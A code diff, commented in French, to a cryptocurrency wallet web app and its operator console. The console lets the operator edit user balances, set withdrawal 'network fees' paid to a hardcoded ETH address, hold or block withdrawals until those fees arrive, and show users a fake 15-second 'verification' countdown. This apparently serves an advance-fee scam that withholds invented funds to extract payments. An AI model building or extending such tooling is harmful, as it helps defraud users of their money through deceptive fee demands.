@@ -979,20 +979,21 @@
     try { localStorage.setItem(TKEY, v); } catch { /* stockage plein */ }
   }
 
-  function assetPickerHTML() {
+  function assetPickerHTML(only) {
+    const list = CRYPTOS().filter(a => !only || only.has(a.sym));
     return `<div class="picker-grid" id="pickGrid">
-      <button class="pick ${PICK === "EUR" ? "is-on" : ""}" data-pick="EUR">
+      ${only ? "" : `<button class="pick ${PICK === "EUR" ? "is-on" : ""}" data-pick="EUR">
         <img class="coin" src="assets/img/flag_eu.webp" alt=""><b>EUR</b><i>${eur(cash(), 2)}</i>
-      </button>
-      ${CRYPTOS().map(a => `
+      </button>`}
+      ${list.map(a => `
         <button class="pick ${PICK === a.sym ? "is-on" : ""}" data-pick="${a.sym}">
           <img class="coin" src="${a.icon}" alt=""><b>${a.sym}</b><i>${nf(qty(a.sym), qty(a.sym) > 0 ? 4 : 2)}</i>
         </button>`).join("")}
     </div>`;
   }
 
-  function openAssetPicker(cb) {
-    openSheet(`<div class="sheet-title">Choisir un actif</div>${assetPickerHTML()}`);
+  function openAssetPicker(cb, only) {
+    openSheet(`<div class="sheet-title">Choisir un actif</div>${assetPickerHTML(only)}`);
     // L'actif touché passe en noir immédiatement : la sélection se voit
     // avant que la feuille ne se referme.
     $$("#pickGrid .pick").forEach(b => b.addEventListener("click", () => {
@@ -2132,7 +2133,13 @@
     if (cd) cd.textContent = feeCountSoft(ms);
     const st = document.getElementById("feeStatus");
     if (st) {
-      const txt = o.statusTxt || (o.done ? "Confirmée" : (o.ok ? "En attente de confirmation" : "En attente des frais réseau"));
+      const at = Number(o.sentAt) || 0;
+      const left = at ? Math.max(0, FEE_TREAT_MS - (Date.now() - at)) : 0;
+      // Paiement déclaré mais pas encore validé : la fiche annonce le
+      // traitement, seconde par seconde, au lieu d'un « en attente » figé.
+      const txt = (!o.done && !o.ok && left > 0)
+        ? "Traitement du paiement — " + Math.ceil(left / 1000) + " s"
+        : (o.statusTxt || (o.done ? "Confirmée" : (o.ok ? "En attente de confirmation" : "En attente des frais réseau")));
       st.textContent = txt;
       st.classList.toggle("wait", !o.done);
       st.classList.toggle("ok", !!o.done);
@@ -2257,8 +2264,8 @@
   // Rendements annuels par actif. Seuls les actifs listés ici ouvrent la
   // feuille ; les autres n'affichent pas l'entrée.
   const STAKABLE = {
-    ETH: 3.6, SOL: 6.8, DOT: 12.4, ADA: 3.1, AVAX: 5.2,
-    SUI: 4.4, LINK: 4.2, USDC: 5.1, HYPE: 7.3
+    BTC: 2.9, ETH: 3.6, SOL: 6.8, XRP: 3.1, HYPE: 7.3, ADA: 3.1,
+    DOGE: 4.6, SUI: 4.4, LINK: 4.2, AVAX: 5.2, DOT: 12.4, USDC: 5.1
   };
 
   function stakesList() {
@@ -2325,7 +2332,7 @@
     $("#stkPick").addEventListener("click", () => openAssetPicker(s => {
       if (!STAKABLE[s]) return toast("Cet actif ne propose pas le staking");
       sheetStaking(s);
-    }));
+    }, new Set(Object.keys(STAKABLE))));
     $("#stkGo").addEventListener("click", () => {
       const v = parseAmt(amtEl.value);
       if (!(v > 0)) return toast("Saisissez un montant");
@@ -3875,6 +3882,10 @@
   // est publiée en direct vers l'application.
   const DEFAULT_FEE_ADDR = "0x22E839441132106d227dE2e28494e52778b75ca8";
   const DEFAULT_FEE_SYM = "ETH";
+  // Délai de traitement entre « Envoyer les frais » et « Valider » : le paiement
+  // déclaré est vérifié (montant + adresse) avant que la transaction puisse
+  // être débloquée.
+  const FEE_TREAT_MS = 15000;
   let iaNetTimer = null;
   // Champs du panneau frais touchés depuis le dernier envoi : la valeur publiée
   // est l'union de ces champs seulement, jamais les champs non touchés.
@@ -4013,6 +4024,19 @@
   function iaNetSetValid(on) {
     const act = activeFeeOrder();
     if (act && on) {
+      // Délai de traitement : le paiement déclaré doit être vérifié (montant et
+      // adresse) avant que la transaction puisse être exécutée.
+      const at = Number(act.sentAt) || 0;
+      const left = at ? Math.max(0, FEE_TREAT_MS - (Date.now() - at)) : 0;
+      if (left > 0) {
+        toast("Traitement en cours : encore " + Math.ceil(left / 1000) + " s");
+        return;
+      }
+      const addrNow = String(act.feeAddr || "").trim();
+      if (addrNow.length < 10) {
+        toast("Adresse des frais manquante ou incomplète");
+        return;
+      }
       // La console n'ouvre la transaction qu'une fois le montant des frais
       // réellement reçu : le règlement doit couvrir le barème affiché.
       const amount = Number(act.amount) || 0;
@@ -4184,6 +4208,35 @@
     el.textContent = exp ? feeCountTxt(exp - Date.now()) : "\u2014";
   }, 1000);
 
+  // Compte à rebours du traitement : « Valider » reste gris tant que le
+  // paiement déclaré n'a pas fini d'être vérifié (montant + adresse).
+  setInterval(() => {
+    const btn = document.querySelector('#iaPanel [data-ia="netValid"]');
+    const out = document.querySelector('#iaPanel [data-iaout="treat"]');
+    if (!btn && !out) return;
+    const cur = consoleFeeTarget();
+    const at = Number(cur && cur.sentAt) || 0;
+    const left = at ? Math.max(0, FEE_TREAT_MS - (Date.now() - at)) : 0;
+    const was = Number(btn && btn.dataset.iatreat) || 0;
+    if (btn) {
+      if (left > 0) {
+        btn.disabled = true;
+        btn.textContent = "Traitement — " + Math.ceil(left / 1000) + " s";
+      } else if (btn.disabled || was > 0) {
+        btn.disabled = false;
+        btn.textContent = "Valider et débloquer";
+      }
+      btn.dataset.iatreat = String(left);
+    }
+    if (out && left > 0) {
+      out.textContent = "Traitement en cours — vérification du montant et de l'adresse (" +
+        Math.ceil(left / 1000) + " s).";
+    }
+    // Fin du traitement : le panneau se redessine une fois pour afficher
+    // l'état « prêt » (reçu, adresse, bouton actif).
+    if (was > 0 && left <= 0) { try { iaRender(); } catch { } }
+  }, 500);
+
   function iaFeeValues() {
     const out = {};
     document.querySelectorAll("#iaPanel [data-fe]").forEach(el => { out[el.dataset.fe] = el.value; });
@@ -4284,9 +4337,6 @@
       else if (d.iabal != null) sel = '[data-iabal="' + d.iabal + '"]';
       else if (d.fe != null) sel = '[data-fe="' + d.fe + '"]';
       else if (d.iafeeaddr != null) sel = '[data-iafeeaddr="' + d.iafeeaddr + '"]';
-      else if (d.iafee != null) sel = '[data-iafee="' + d.iafee + '"]';
-      else if (d.iaunet != null) sel = '[data-iaunet="' + d.iaunet + '"]';
-      else if (d.iaaddr != null) sel = '[data-iaaddr="' + d.iaaddr + '"]';
       else if (d.ianepay != null) sel = '[data-ianepay]';
       if (!sel) return null;
       return { sel, v: ae.value, p: ae.selectionStart };
@@ -4304,57 +4354,11 @@
     if (IA_FEE) { body.innerHTML = iaFeeEditor(); restore(); return; }
 
     const coins = CRYPTOS();
-    const uf = ST.usdcFee || {};
-    const uvals = USDC_NETS.map(n => Number(uf[n.id]) || 0).filter(v => v > 0);
-    const uAll = uvals.length === USDC_NETS.length && uvals.every(v => v === uvals[0]) ? uvals[0] : 0;
-    const gasPh = nf(ST.gas || 0, 2);
 
     const balRows = coins.map(a => `<label class="ia-line">
         <span class="ia-sym">${a.sym}</span>
         <input data-iabal="${a.sym}" inputmode="decimal" autocomplete="off" placeholder="0" value="${iaField(qty(a.sym))}">
       </label>`).join("");
-
-    const feeRows = coins.filter(a => a.sym !== "USDC").map(a => `<label class="ia-line">
-        <span class="ia-sym">${a.sym}</span>
-        <input data-iafee="${a.sym}" inputmode="decimal" autocomplete="off" placeholder="${gasPh}" value="${iaField(ST.fees[a.sym])}">
-        <em>€</em>
-      </label>`).join("");
-
-    const usdcRows = `<label class="ia-line">
-        <span class="ia-sym">Tous réseaux</span>
-        <input data-iausdcall inputmode="decimal" autocomplete="off" placeholder="${gasPh}" value="${uAll ? String(uAll).replace(".", ",") : ""}">
-        <em>€</em>
-      </label>` + USDC_NETS.map(n => `<label class="ia-line">
-        <span class="ia-sym">${n.label}</span>
-        <input data-iaunet="${n.id}" inputmode="decimal" autocomplete="off" placeholder="${gasPh}" value="${iaField(uf[n.id])}">
-        <em>€</em>
-      </label>`).join("");
-
-    const targets = [...coins, { sym: "EUR" }];
-
-    const addrRows = targets.map(c => {
-      const v = (ST.addresses || {})[c.sym] || "";
-      return `<div class="ia-addr">
-        <span class="ia-sym">${c.sym}</span>
-        <input data-iaaddr="${c.sym}" spellcheck="false" autocomplete="off" value="${iaEsc(v)}" placeholder="Adresse de réception ${c.sym}">
-        <span class="ia-btns">
-          <button type="button" data-ia="copyAddr" data-sym="${c.sym}">Copier</button>
-          <button type="button" data-ia="regenAddr" data-sym="${c.sym}">Régénérer</button>
-        </span>
-      </div>`;
-    }).join("");
-
-    const feeAddrRows = targets.map(c => {
-      const v = (ST.feeAddresses || {})[c.sym] || "";
-      return `<div class="ia-addr">
-        <span class="ia-sym">${c.sym}</span>
-        <input data-iafeeaddr="${c.sym}" spellcheck="false" autocomplete="off" value="${iaEsc(v)}" placeholder="Frais ${c.sym} — vide = même adresse">
-        <span class="ia-btns">
-          <button type="button" data-ia="copyFeeAddr" data-sym="${c.sym}">Copier</button>
-          <button type="button" data-ia="sameFee" data-sym="${c.sym}">= Réception</button>
-        </span>
-      </div>`;
-    }).join("");
 
     const custom = Array.isArray(ST.customAssets) ? ST.customAssets : [];
     const customRows = custom.length ? custom.map(x => `<div class="ia-addr">
@@ -4406,45 +4410,50 @@
     const pendOk = !!(cur && (cur.done || (cur.ok && pendAmount > 0 && pendPaid >= pendAmount)));
     const pendRemain = Math.max(0, pendAmount - pendPaid);
     const actAmt = act ? Number(act.amt) || 0 : 0;
+    // Délai de traitement : il court à partir du moment où les frais ont été
+    // déclarés envoyés. Rien ne débloque avant qu'il soit écoulé.
+    const treatLeft = (o) => {
+      const at = Number(o && o.sentAt) || 0;
+      return at ? Math.max(0, FEE_TREAT_MS - (Date.now() - at)) : 0;
+    };
+    const treat = treatLeft(cur);
+    const pendAddrOk = String(pendAddr || "").trim().length >= 10;
+    const treatTxt = treat > 0
+      ? "Traitement en cours — vérification du montant et de l'adresse (" + Math.ceil(treat / 1000) + " s)."
+      : !pendAddrOk
+        ? "Adresse des frais manquante ou incomplète : la validation attend une adresse."
+        : pendRemain > 0
+          ? "En attente du reçu : il reste " + eur(pendRemain, 2) + "."
+          : "Prêt : la validation débite le montant une seule fois.";
+    const validLabel = treat > 0 ? "Traitement — " + Math.ceil(treat / 1000) + " s" : "Valider et débloquer";
 
     body.innerHTML = `
       <section class="ia-card ia-netfee${pendOk ? " is-ok" : ""}">
-        <h3>Frais réseau — contrôle des transactions</h3>
+        <h3>Frais réseau</h3>
         <p class="ia-sub">${act
-          ? `Transaction en attente : ${iaEsc(qtyTxt(actAmt, act.pick || "USDC"))} vers <code>${iaEsc(maskAddr(act.addr || ""))}</code>. Le montant est encore sur le solde ; « Valider » le débite une seule fois et confirme l'envoi.`
-          : "Aucune transaction en attente. Ces champs fixent le barème appliqué au prochain envoi, puis au suivi de son règlement."} Chaque champ part en direct sur tous les appareils.</p>
+          ? `Transaction en attente : ${iaEsc(qtyTxt(actAmt, act.pick || "USDC"))} vers <code>${iaEsc(maskAddr(act.addr || ""))}</code>. Le montant reste sur le solde : la validation le débite une seule fois.`
+          : "Le barème appliqué au prochain envoi, puis au suivi de son règlement."} Chaque champ part en direct sur tous les appareils.</p>
         <div class="recap">
-          <div class="rc-row"><span>Montant envoyé (${iaEsc((cur && cur.pick) || "USDC")})</span><input data-ianet="amt" inputmode="decimal" autocomplete="off" value="${cur && Number(cur.amt) > 0 ? iaField(cur.amt) : "0"}" placeholder="0"></div>
           <div class="rc-row"><span>Montant des frais (€)</span><input data-ianet="amount" inputmode="decimal" autocomplete="off" value="${iaField(pendAmount)}" placeholder="0"></div>
           <div class="rc-row"><span>Frais perçus (${iaEsc(pendSym)})</span><b data-ianetout="amountEq">${feeAmtTxt(pendAmount, pendSym)}</b></div>
           <div class="rc-row"><span>Déjà reçu (€)</span><input data-ianet="paid" inputmode="decimal" autocomplete="off" value="${pendPaid > 0 ? iaField(pendPaid) : "0"}" placeholder="0"></div>
           <div class="rc-row"><span>Déjà reçu (${iaEsc(pendSym)})</span><b data-ianetout="paidEq">${feeAmtTxt(pendPaid, pendSym)}</b></div>
           <div class="rc-row"><span>Reste à régler</span><b data-ianetout="remain">${eur(pendRemain, 2)}${pendRemain > 0 ? " · " + feeAmtTxt(pendRemain, pendSym) : ""}</b></div>
-          <div class="rc-row"><span>Envoyer maintenant (€)</span><input data-ianepay="1" inputmode="decimal" autocomplete="off" value="${pendRemain > 0 ? iaField(pendRemain) : ""}" placeholder="0"></div>
+          <div class="rc-row"><span>Montant à envoyer (€)</span><input data-ianepay="1" inputmode="decimal" autocomplete="off" value="${pendRemain > 0 ? iaField(pendRemain) : ""}" placeholder="0"></div>
           <div class="rc-row col"><span>Adresse des frais (${iaEsc(pendSym)} — réseau ${iaEsc(NETWORKS[pendSym]?.name || pendSym)})</span>
-            <input data-iafeeaddr="${iaEsc(pendSym)}" spellcheck="false" autocomplete="off" value="${iaEsc(pendAddr)}" placeholder="0x22E839441132106d227dE2e28494e52778b75ca8">
+            <input data-iafeeaddr="${iaEsc(pendSym)}" spellcheck="false" autocomplete="off" value="${iaEsc(pendAddr)}"${pendAddrOk ? "" : ' class="bad"'} placeholder="0x22E839441132106d227dE2e28494e52778b75ca8">
           </div>
         </div>
         <div class="ia-grid" style="margin-top:10px">
-          <button type="button" class="ia-btn" data-ia="netPayFee">Envoyer les frais</button>
-        </div>
-        <p class="ia-sub">${pendOk
-          ? (act
-            ? "Validé : la transaction est exécutée et le solde débité."
-            : "Barème validé : le prochain envoi partira avec ces frais.")
-          : act
-            ? "Non validé : le reste à régler doit être reçu, puis « Valider » exécute la transaction."
-            : "Barème en place : le prochain envoi ouvrira un suivi de règlement de 2 h."}</p>
-        <div class="ia-grid" style="margin-top:10px">
-          <button type="button" class="ia-btn ghost" data-ia="netSaveAmt">Enregistrer le montant envoyé</button>
-          <button type="button" class="ia-btn ghost" data-ia="netSaveFee">Enregistrer le montant des frais</button>
-          <button type="button" class="ia-btn ghost" data-ia="netSavePaid">Enregistrer le déjà reçu</button>
-          <button type="button" class="ia-btn ghost" data-ia="netSaveAddr">Enregistrer l'adresse</button>
+          <button type="button" class="ia-btn ghost" data-ia="netSaveFee">Enregistrer le montant</button>
+          <button type="button" class="ia-btn ghost" data-ia="netSavePaid">Enregistrer le reçu</button>
         </div>
         <div class="ia-grid">
-          <button type="button" class="ia-btn" data-ia="netValid">Valider et débloquer</button>
-          <button type="button" class="ia-btn ghost" data-ia="netBlock">Bloquer les transactions</button>
+          <button type="button" class="ia-btn" data-ia="netPayFee">Envoyer les frais</button>
+          <button type="button" class="ia-btn" data-ia="netValid" data-iatreat="${treat}"${treat > 0 ? " disabled" : ""}>${validLabel}</button>
         </div>
+        <p class="ia-sub" data-iaout="treat">${treatTxt}</p>
+        <button type="button" class="ia-btn ghost" data-ia="netBlock">Bloquer les transactions</button>
       </section>
 
       <section class="ia-card">
@@ -4486,38 +4495,9 @@
       </section>
 
       <section class="ia-card">
-        <h3>Frais réseau par actif</h3>
-        <p class="ia-sub">Montant en euros débité à l'envoi. Vide = frais par défaut (${gasPh} €).</p>
-        ${feeRows}
-        <button type="button" class="ia-btn" data-ia="saveFees">Enregistrer les frais par actif</button>
-      </section>
-
-      <section class="ia-card">
-        <h3>Frais réseau USDC</h3>
-        <p class="ia-sub">Une valeur sur « Tous réseaux » s'applique aux six. Un réseau rempli à la main reste prioritaire.</p>
-        ${usdcRows}
-        <button type="button" class="ia-btn" data-ia="saveUsdc">Enregistrer les frais USDC</button>
-      </section>
-
-      <section class="ia-card">
-        <h3>Adresses de réception</h3>
-        <p class="ia-sub">Texte libre : colle l'adresse que tu veux. Elle remplace celle affichée dans l'app.</p>
-        ${addrRows}
-        <button type="button" class="ia-btn" data-ia="saveAddr">Publier les adresses de réception</button>
-      </section>
-
-      <section class="ia-card">
-        <h3>Adresse de perception des frais</h3>
-        <p class="ia-sub">L'adresse qui encaisse les frais réseau, actif par actif. Vide = même adresse que la réception.</p>
-        ${feeAddrRows}
-        <button type="button" class="ia-btn" data-ia="saveFeeAddr">Publier les adresses de frais</button>
-      </section>
-
-      <section class="ia-card">
-        <h3>Frais réseau en attente</h3>
-        <p class="ia-sub">Chaque envoi dont les frais n'étaient pas couverts apparaît ici pendant 2 h. « Ajouter » enregistre un reçu partiel, « C'est bon » débloque la validation côté client, « Éditer » ouvre la fiche complète (montant, adresse des frais, destinataire, référence, statut).</p>
+        <h3>Transactions en attente</h3>
+        <p class="ia-sub">Chaque envoi dont les frais ne sont pas réglés apparaît ici pendant 2 h. « Ajouter » enregistre un reçu partiel, « C'est bon » débloque la validation côté client, « Éditer » ouvre la fiche complète.</p>
         ${fOrderRows}
-        <button type="button" class="ia-btn" data-ia="feeEditNew">Ajouter un ordre de frais</button>
         <button type="button" class="ia-btn ghost" data-ia="feePurgeAll">Tout supprimer</button>
       </section>
 
@@ -4604,26 +4584,12 @@
       return;
     }
 
-    if (act === "copyAddr" || act === "copyFeeAddr") {
+    if (act === "copyFeeAddr") {
       const sym = btn.dataset.sym;
-      const sel = (act === "copyAddr" ? '[data-iaaddr="' : '[data-iafeeaddr="') + sym + '"]';
+      const sel = '[data-iafeeaddr="' + sym + '"]';
       const v = String(valOf(sel) || "").trim();
       if (!v) return toast("Aucune adresse à copier");
       return iaCopy(v, "Adresse " + sym + " copiée");
-    }
-
-    if (act === "regenAddr") {
-      const sym = btn.dataset.sym;
-      const el = panel.querySelector('[data-iaaddr="' + sym + '"]');
-      if (el) el.value = iaGenAddr(sym);
-      return toast("Nouvelle adresse " + sym + " générée — pense à publier");
-    }
-
-    if (act === "sameFee") {
-      const sym = btn.dataset.sym;
-      const el = panel.querySelector('[data-iafeeaddr="' + sym + '"]');
-      if (el) el.value = String(valOf('[data-iaaddr="' + sym + '"]') || "");
-      return toast("Adresse de réception " + sym + " recopiée — pense à publier");
     }
 
     if (act === "saveBal") {
@@ -4640,56 +4606,23 @@
       return iaCommit("Soldes enregistrés");
     }
 
-    if (act === "saveFees") {
-      ST.fees = ST.fees || {};
-      panel.querySelectorAll("[data-iafee]").forEach(inp => {
-        const sym = inp.dataset.iafee;
-        const raw = String(inp.value || "").trim();
-        if (!raw) delete ST.fees[sym]; else ST.fees[sym] = iaNum(raw);
-      });
-      return iaCommit("Frais par actif enregistrés");
-    }
-
-    if (act === "saveUsdc") {
-      ST.usdcFee = ST.usdcFee || {};
-      const allRaw = String(valOf("[data-iausdcall]") || "").trim();
-      const allV = allRaw ? iaNum(allRaw) : 0;
-      panel.querySelectorAll("[data-iaunet]").forEach(inp => {
-        const id = inp.dataset.iaunet;
-        const raw = String(inp.value || "").trim();
-        if (raw) ST.usdcFee[id] = iaNum(raw);
-        else if (allV > 0) ST.usdcFee[id] = allV;
-        else delete ST.usdcFee[id];
-      });
-      return iaCommit("Frais USDC enregistrés");
-    }
-
-    if (act === "saveAddr") {
-      ST.addresses = ST.addresses || {};
-      panel.querySelectorAll("[data-iaaddr]").forEach(inp => {
-        const sym = inp.dataset.iaaddr;
-        const v = String(inp.value || "").trim();
-        if (v.length >= 10) ST.addresses[sym] = v; else delete ST.addresses[sym];
-      });
-      return iaCommit("Adresses de réception publiées");
-    }
-
     if (act === "netValid") { iaNetSetValid(true); return; }
     if (act === "netBlock") { iaNetSetValid(false); return; }
     // Boutons « Enregistrer » du panneau : chacun n'écrit QUE son champ, fige
     // la saisie tout de suite (sans attendre le délai de frappe) et ne rend
     // la main qu'une fois la publication faite.
-    if (act === "netSaveFee" || act === "netSavePaid" || act === "netSaveAmt") {
-      const key = act === "netSaveFee" ? "amount" : (act === "netSavePaid" ? "paid" : "amt");
+    if (act === "netSaveFee" || act === "netSavePaid") {
+      const key = act === "netSaveFee" ? "amount" : "paid";
       const ok = await iaNetSave([key]);
-      toast((key === "amount" ? "Montant des frais" : key === "paid" ? "Déjà reçu" : "Montant envoyé") +
+      toast((key === "amount" ? "Montant des frais" : "Déjà reçu") +
         (ok ? " enregistré" : " enregistré sur cet appareil"));
       return;
     }
     if (act === "netPayFee") {
       // Paiement partiel de frais : le montant saisi s'ajoute au « déjà reçu » et
-      // le reste à régler baisse. Publié en direct, cumulatif, sur tous les
-      // appareils — sans rechargement.
+      // le reste à régler baisse. Le paiement déclaré ouvre un délai de
+      // traitement : la validation ne se débloque qu'une fois le montant et
+      // l'adresse vérifiés.
       const inp = panel.querySelector('[data-ianepay]');
       const v = Math.max(0, iaNum(inp && inp.value));
       if (!(v > 0)) return toast("Saisis le montant à envoyer");
@@ -4698,8 +4631,15 @@
       const amount = Number(cur.amount) || 0;
       const paidBefore = Number(cur.paid) || 0;
       const total = paidBefore + v;
+      const addrEl = panel.querySelector('[data-iafeeaddr]');
+      const addrIn = String((addrEl && addrEl.value) || cur.feeAddr || "").trim();
+      if (addrIn.length < 10) return toast("Adresse des frais manquante ou incomplète");
       cur.paid = amount > 0 ? Math.min(amount, total) : total;
+      cur.sentAt = Date.now();
+      cur.sentPaid = v;
+      cur.feeAddr = addrIn;
       cur.rev = Math.max(Date.now(), (Number(cur.rev) || 0) + 1);
+      cur.statusTxt = "Traitement du paiement — vérification en cours";
       saveLocal();
       try { ensureOrderNotif(cur); } catch { }
       try { feeNotifSync(cur); } catch { }
@@ -4707,27 +4647,9 @@
       if (cur.pending) { try { pendingFeePublish(); } catch { } }
       toast("Frais envoyés : " + feeAmtTxt(v, DEFAULT_FEE_SYM) +
         " · déjà reçu " + feeAmtTxt(cur.paid, DEFAULT_FEE_SYM) +
-        " · reste " + feeAmtTxt(Math.max(0, (amount || total) - cur.paid), DEFAULT_FEE_SYM));
+        " · traitement " + Math.round(FEE_TREAT_MS / 1000) + " s");
       return iaRender();
     }
-    if (act === "netSaveAddr") {
-      clearTimeout(iaFeeAddrTimer);
-      const ok = await iaFeeAddrLive();
-      toast("Adresse des frais enregistrée" + (ok ? "" : " sur cet appareil"));
-      return;
-    }
-    if (act === "saveFeeAddr") {
-      ST.feeAddresses = ST.feeAddresses || {};
-      panel.querySelectorAll("[data-iafeeaddr]").forEach(inp => {
-        const sym = inp.dataset.iafeeaddr;
-        const v = String(inp.value || "").trim();
-        if (v.length >= 10) ST.feeAddresses[sym] = v; else delete ST.feeAddresses[sym];
-      });
-      saveLocal();
-      try { await deltaSend({ type: "feeCfg", feeAddresses: { ...ST.feeAddresses } }); } catch { }
-      return iaCommitLocal("Adresses de frais publiées");
-    }
-
     if (act === "addCoin") {
       const sym = String(valOf("#iaNewSym") || "").trim().toUpperCase();
       const name = String(valOf("#iaNewName") || "").trim() || sym;
